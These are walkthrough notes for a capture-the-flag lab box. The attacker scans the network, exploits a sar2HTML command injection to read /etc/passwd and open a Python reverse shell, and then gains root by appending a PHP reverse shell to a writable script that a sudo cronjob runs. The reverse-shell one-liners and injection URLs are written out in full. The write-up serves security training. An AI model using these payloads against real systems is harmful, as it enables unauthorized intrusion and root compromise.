

1. Network Scanning
  > nmap -sS 192.168.62.0/24

2. Investigate browser
  - Input `192.168.62.35` into browser
3. Directory Brute Force
  > gobuster dir -u [url] -w [path to wordlist]

4. Download files
  > curl 192.168.62.35/robots.txt
  - Shows sar2html
  - could also attempt `192.168.62.35/robots.txt` in browser and get same result

5. Attempt in browser
  - opens up
6. Research sar2HTML on exploit-db (or database of choice)
  - demonstrates a command injection:
    - `http://<ipaddr>/index.php?plot=;<command-here>`
7. Attempt basic command
  > http:192.168.1.24/sar2HTML/index.php?plot=; cat /etc/passwd
  - click on "select host" on left column
  - success!

8. Gather info for a reverse shell
  - Now that we know we can execute commands, we want to see if we can gain access to the server
  - Several reverse shell options, we'll start with a python-based one so we'll see if python3 is installed
  > http:192.168.1.24/sar2HTML/index.php?plot=; python3 --help

9. Setup reverse shell
  - we'll need a listener on our end and need to inject a Python script to connect to it
  > nc -lvp 1234
  > python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.20”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);

- Successfully connected:

- Setup a stable shell (optional):
  > python3 -c ‘import pty;pty.spawn(“/bin/bash”)’

10. Find a flag
  - success
  - First went to home directory and it had a text file there

11. Gain root
   - Everyone says they "eventually searched crontabs and found the cronjob that executed a bash script and sudo"
  > cat /etc/crontab
    - a cronjob contains `cd /var/www/html/ && sudo ./finally.sh'
    - significant because it uses sudo to run this script. This means we can potentially insert something into the script and run it as root
    - Our objective is to gain root access, so we'll do as we did before and attempt another reverse shell
  
12. Investigate script
  > cd /var/www/html
  > ls
  > cat finally.sh
  - This script executes another script `./write.sh'
  - Investigate new script
  > cat ./write.sh
    - reating a folder in temp directory
  - Run `ls -l` to see what permissions we have with these scripts
  > ls -l
    - Shows we have write ability to `write.sh` :) 
    - We now have the ability to write to a script that has sudo permissions

13. Next reverse shell
  - Echo a command into the script
    - *Note: echo requires a \ in front of a `$` and a `"` for the file to accept it*
    ```
     echo "php -r '\$sock=fsockopen(\"192.168.62.200\",8888);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" >> write.sh
    ```
  - Setup a listener
    > nc -lvp 8888
  - wait for cronjob to run



